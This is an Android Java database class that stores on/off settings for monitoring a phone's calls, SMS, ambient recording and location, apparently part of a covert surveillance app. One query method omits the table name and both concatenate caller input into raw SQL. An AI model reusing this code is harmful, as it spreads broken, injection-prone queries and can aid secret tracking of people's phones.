package com.privacy.system.db;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.privacy.system.base.BaseSqlite;
import com.privacy.system.domain.Monitor;
import com.privacy.system.util.Logger;

/**
 * 操作监控表
 */
public class MonitorDB extends BaseSqlite {

	/**表名*/
	public static final String  TABLE_NAME = "monitor";
	private static MonitorDB monitorDB;
	
	public static MonitorDB getInstance(Context context){
		if(monitorDB==null){
			monitorDB = new MonitorDB(context);
		}
		return monitorDB;
	}
	
	private MonitorDB(Context context) {
		super(context);
		
	}

	@Override
	protected String tableName() {
		
		return TABLE_NAME;
	}

	@Override
	protected String[] tableColumns() {
		String [] colums = {Monitor.COL_ID,Monitor.COL_CALL_MONITOR_STATUS,Monitor.COL_ENV_REC_MONITOR_STATUS,Monitor.COL_SMS_MONITOR_STATUS,Monitor.COL_FILTER_STATUS,Monitor.COL_LOCATIONSTATUS,Monitor.COL_PHONE};
		return colums;
	}
	
	public boolean insert(Monitor monitor){
		ContentValues values = new ContentValues();
		values.put(Monitor.COL_CALL_MONITOR_STATUS,monitor.getCallMonitorStatus());
		values.put(Monitor.COL_ENV_REC_MONITOR_STATUS,monitor.getEnvRecMonitorStatus());
		values.put(Monitor.COL_SMS_MONITOR_STATUS,monitor.getSmsMonitorStatus());
		values.put(Monitor.COL_FILTER_STATUS,monitor.getFilterStatus());
		values.put(Monitor.COL_LOCATIONSTATUS,monitor.getLocationStatus());
		values.put(Monitor.COL_PHONE,monitor.getPhone());
		try {
			this.insert(values);
		} catch (Exception e) {
			Logger.e("MonitorDB",e.getMessage());
			return false;
		}
		return true;
	}
	
	/**只查询一列信息*/
	public String queryOnlyColumn (String where,String colums,String selectionArgs){
		String result = "";
		SQLiteDatabase db =getSqLiteOpenHelper().getReadableDatabase();
		if(db !=null && db.isOpen()){
			Cursor cursor = db.rawQuery("select " + colums +" from where " + where, new String []{selectionArgs});
			if(cursor !=null){
				while(cursor.moveToNext()){
					int index = cursor.getColumnIndex(colums);
					if(index !=-1){
						result = cursor.getString(index);
						return result;
					}
				}
			}
		}
		return result;
	}
	
	/**只查询一列信息*/
	public synchronized Monitor queryOnlyRow (String where,String [] selectionArgs){
		Monitor monitor = null;
		SQLiteDatabase db =getSqLiteOpenHelper().getReadableDatabase();
		if(db !=null && db.isOpen()){
			Cursor cursor =  db.rawQuery("select * from " + tableName() + " where " + where , selectionArgs);
			if(cursor !=null){
				while(cursor.moveToNext()){
					monitor = new Monitor();
					monitor.setCallMonitorStatus(cursor.getString(cursor.getColumnIndex(Monitor.COL_CALL_MONITOR_STATUS)));
					monitor.setSmsMonitorStatus(cursor.getString(cursor.getColumnIndex(Monitor.COL_SMS_MONITOR_STATUS)));
					monitor.setFilterStatus(cursor.getString(cursor.getColumnIndex(Monitor.COL_FILTER_STATUS)));
					monitor.setEnvRecMonitorStatus(cursor.getString(cursor.getColumnIndex(Monitor.COL_ENV_REC_MONITOR_STATUS)));
					monitor.setLocationStatus(cursor.getString(cursor.getColumnIndex(Monitor.COL_LOCATIONSTATUS)));
					monitor.setPhone(cursor.getString(cursor.getColumnIndex(Monitor.COL_PHONE)));
				}
			}
		}
		return monitor;
	}
	
	public void update(Monitor monitor,String where,String [] selectionArgs){
		ContentValues values = new ContentValues();
		values.put(Monitor.COL_CALL_MONITOR_STATUS,monitor.getCallMonitorStatus());
		values.put(Monitor.COL_ENV_REC_MONITOR_STATUS,monitor.getEnvRecMonitorStatus());
		values.put(Monitor.COL_SMS_MONITOR_STATUS,monitor.getSmsMonitorStatus());
		
		values.put(Monitor.COL_FILTER_STATUS,monitor.getFilterStatus());
		values.put(Monitor.COL_LOCATIONSTATUS,monitor.getLocationStatus());
		super.update(values, where,selectionArgs);
	}
}
